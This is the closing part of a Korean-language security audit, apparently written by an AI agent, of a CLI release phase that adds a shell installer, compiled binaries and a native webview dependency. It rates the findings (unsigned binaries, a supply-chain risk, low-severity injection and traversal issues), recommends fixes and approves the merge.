- ✅ `--minify` (R/E 난이도 상승)
- ✅ Static JSON import 로 package.json 버전 embed (no filesystem lookup)
- ✅ SHA256SUMS.txt 공개

**부정 측면**:
- 🟡 M-01: 서명 없음
- ℹ️ 바이너리 크기 ~112MB — 공급망 공격자에게 "Bun 런타임 버전 + 모든 deps" 의 정보를 공개하지만 Bun 은 공개 소스라 추가 위험 거의 없음

---

## 7. 종합 판정

### Critical / High
**0건**. Phase 9 merge 를 차단할 보안 이슈 없음.

### Medium
| ID | 제목 | Merge-block | 해결 경로 |
|---|---|---|---|
| M-01 | 배포 바이너리 서명 / SLSA attestation 부재 | **No** | Phase 9.1 — 이미 follow-up 로드맵에 1번 항목 |
| M-02 | webview-bun 공급망 단일 장애점 | **No** | Phase 9.1 — FFI fallback prototype 권장 |

### Low
| ID | 제목 | 해결 경로 |
|---|---|---|
| L-01 | `MANDU_REPO` override 조용히 수락 | Phase 9.1 — 3초 warning 추가 |
| L-02 | `MANDU_INSTALL_DIR` shell profile injection | Phase 9.1 — unsafe char 필터 |
| L-03 | `mandu desktop --entry=<abs>` 외부 디렉토리 write | Phase 9.1 — cwd 검증 추가 |
| L-04 | ANSI escape passthrough | Phase 9.1 — `renderMarkdown` 전처리 |

### Info (5건)
문서화만, 즉시 조치 불요.

---

## 8. 결론 / Merge 권장

**Critical 0 / High 0. Phase 9 merge 를 차단할 보안 이슈 없음.**

### 긍정 측면

1. **새 공격 표면 3 종 모두 최소 방어 충족**: installer 는 HTTPS + SHA-256 검증, 바이너리는 checksum 공개 + `[early-access]` 명시, FFI peer 는 optional + lazy + URL validation.
2. **프로세스 방어 우수**: Template embedding 이 generator + byte-identical 테스트로 보호 — 중앙 repo 외부에서 템플릿 조작 불가.
3. **Phase 7 방어 체계 완전 보존**: Phase 9 가 runtime/bundler 를 건드리지 않아 기존 방어막 0 건 훼손. manifest-schema 21/21 pass + CLI 221/0 pass.
4. **공급망 정결**: `webview-bun` postinstall 없음 + prebuilt DLL 직접 배포 → install-time code execution 없음.
5. **피어 선언 우수**: `peerDependenciesMeta.optional: true` + lazy import + actionable install 에러 3 단계 → web-only 사용자 완전 무영향.
6. **의도된 기술 부채 명시**: M-01 (unsigned binary) 이 release note `[early-access]` 로 사용자에게 투명하게 공개됨.
7. **테스트 커버**: Phase 9 신규 CLI 221 + core desktop 25 + phase 7.2 regression 21 = 모두 pass, 0 fail.
8. **감사 대상 코드 약 2,600 줄 (Phase 9.R1 신규) + ~200 줄 (R2 패치)** — 기존 보안 블록 훼손 없이 병합 완료.

### 부정 측면

1. **M-01 (서명)**: Phase 9.1 까지 공식 보류. 현재는 사용자 경고로만 대응 — 개선 로드맵 명확.
2. **M-02 (webview-bun)**: 외부 의존성 공급망 리스크. FFI fallback 문서화는 존재하나 prototype 없음 → Phase 9.1 에서 구현 권장.
3. **ANSI injection (L-04)**: 현재 로컬-only 영향이라 Low. CI 환경에서 `mandu init` 을 자동화하는 경우 UX/trust 이슈 증가 가능성 → Phase 9.1 에서 filter 추가 권장.

### 다음 단계 (post-merge)

1. **Phase 9 merge 진행** — 본 감사 기준 차단 사유 없음.
2. **Phase 9.1 우선순위** (권장 순서):
   - M-01 code signing (Windows EV cert + macOS Developer ID + SLSA attestation)
   - M-02 FFI fallback prototype (`@mandujs/core/desktop/ffi-fallback.ts`)
   - L-04 `renderMarkdown` control-char sanitizer
   - L-01 + L-02 installer hardening (warning + char filter)
   - L-03 desktop entry path traversal 거부
   - I-01 `softprops/action-gh-release` SHA pin
   - I-03 `@mandujs/skills` manifest 임베딩 (binary UX 개선)
3. **문서 보강**:
   - `docs/bun/phase-9-benchmarks.md` 에 "ANSI injection 방어는 Phase 9.1" 명시
   - `README.md` / `install.md` 에 "바이너리 서명은 Phase 9.1" 주의 (이미 release note 에는 존재)

---

## 9. 감사자 노트

Phase 9 는 보기 드물게 **3 종의 새 공격 표면** (installer / binary distribution / native FFI) 을 한 라운드에서 도입한 케이스. 그럼에도 불구하고 각 표면에 대해 최소 방어가 구비되어 있고, 위험이 큰 항목 (M-01 signing) 은 로드맵에 명시적 follow-up 으로 등재되어 있어 **transparency 면에서 우수**.

Phase 9 특유 공격면은 세 가지였다:
1. **Installer `curl | sh`** — 네트워크 기반 공격 표면. HTTPS + checksum 로 최소 방어, env override 에 대한 loud warning 이 부재.
2. **Compiled binary 배포** — 서명 없음. release note `[early-access]` 로 공개된 기술 부채. 사용자 측 방어는 SHA256SUMS.txt 만.
3. **webview-bun FFI peer** — 외부 단일-maintainer 의존성. Lazy import + optional peer + URL allowlist 3 중 방어, fallback 문서화 존재.

네 번째 잠재 공격면 — **`Bun.markdown.ansi` 의 ANSI passthrough** — 이 자동화 파이프라인에서 의미를 가질 수 있음. Phase 9.1 에서 `renderMarkdown` 에 control-char sanitizer 추가 권장.

다섯 번째 — **Template embedding** — 이 generator + byte-identical 테스트로 보호되어 있어 현재 Phase 에서 가장 견고한 방어 체계. `binary-landing.test.ts:54-76` 가 manifest 와 on-disk 파일 불일치를 즉시 탐지하므로, 악의적 generator 수정이나 stale 재생성이 CI 에서 차단됨.

감사 대상 코드 (신규):
- `packages/cli/src/cli-ux/markdown.ts` 112
- `packages/cli/src/util/templates.ts` 140
- `packages/cli/src/commands/desktop.ts` 274
- `packages/cli/scripts/generate-template-manifest.ts` 404
- `packages/cli/scripts/build-binary.ts` 179
- `packages/cli/generated/templates-manifest.js` 255 (auto-generated)
- `packages/cli/generated/cli-ux-manifest.js` 37 (auto-generated)
- `packages/core/src/desktop/window.ts` 493
- `packages/core/src/desktop/worker.ts` 180
- `packages/core/src/desktop/types.ts` 159
- `packages/core/src/desktop/index.ts` 44
- `.github/workflows/release-binaries.yml` 319
- `install.sh` 309
- `install.ps1` 257
- `install.bash` 86
- `.github/workflows/__tests__/smoke-install.sh` 227

**약 3,600 줄 신규 + ~200 줄 R2 패치** — Phase 7.0 (4,500) / 7.1 (2,500) / 7.2 (3,500) 와 비슷한 스케일. 기존 보안 블록 훼손 없이 병합한 것이 긍정적.

**Merge 판정**: `bun run typecheck` 4 packages clean + Phase 9 전체 테스트 (CLI 221 / core desktop 25 / manifest-schema 21) 0 fail 확인. **merge 가능**.

---

*감사 시작: 2026-04-18, 종료: 2026-04-18*
*감사자: Agent E (security-engineer) — Phase 9.R3*
*감사 대상 커밋: `7a09c6d` (R2 binary-mode markdown fix + cross-compile dry-run + hard assertions PASS)*
